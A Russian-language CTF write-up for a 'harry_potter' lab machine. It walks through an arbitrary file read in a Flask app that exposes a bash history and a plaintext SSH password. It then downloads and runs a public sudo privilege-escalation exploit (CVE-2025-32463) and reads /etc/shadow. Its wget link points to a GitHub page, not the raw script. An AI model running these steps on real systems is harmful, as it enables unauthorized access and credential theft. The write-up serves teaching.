# WriteUp: ctf_harry_potter

## Шаг 1: Разведка

Сканируем порты:
```bash
nmap -p 1022,1080 <IP>
```

Находим:
- Порт 1080: HTTP (Flask приложение)
- Порт 1022: SSH

## Шаг 2: Исследование веб-приложения

Заходим на `http://<IP>:1080/`:
```
Добро пожаловать на мой первый сайт!
Вы можете добавить в адресной строке /show?file=harry.txt и прочитать отрывок из Гарри Поттера
```

## Шаг 3: Поиск подсказок

Читаем .bash_history пользователя davy:
```bash
curl "http://<IP>:1080/show?file=.bash_history"
```

Находим:
```
cat password.txt > joey_ssh_creds.txt
```

Это подсказка! Читаем password.txt:
```bash
curl "http://<IP>:1080/show?file=password.txt"
```

Получаем пароль: `Je8pw3dFmWRUqeFm3i3l`

## Шаг 4: SSH подключение
```bash
ssh -p 1022 joey@<IP>
# Вводим пароль: Je8pw3dFmWRUqeFm3i3l
```

## Шаг 5: Поиск информации о sudo

Читаем notes.txt пользователя joey:
```bash
cat notes.txt
```

Видим:
```
- Сказать админам, что есть проблема с sudo
```

Проверяем версию sudo:
```bash
sudo --version
# Sudo version 1.9.16p2
```

## Шаг 6: Эксплуатация уязвимости sudo

Ищем эксплойт для sudo 1.9.16p2 (CVE-2025-32463).

Используем эксплойт:
```bash
# Скачиваем эксплойт
wget https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh
chmod +x sudo-chwoot.sh
./sudo-chwoot.sh
```

Получаем root-доступ!

## Шаг 7: Получение флага
```bash
cat /etc/shadow
```

**Флаг:** `FECTF{harry_potter}`
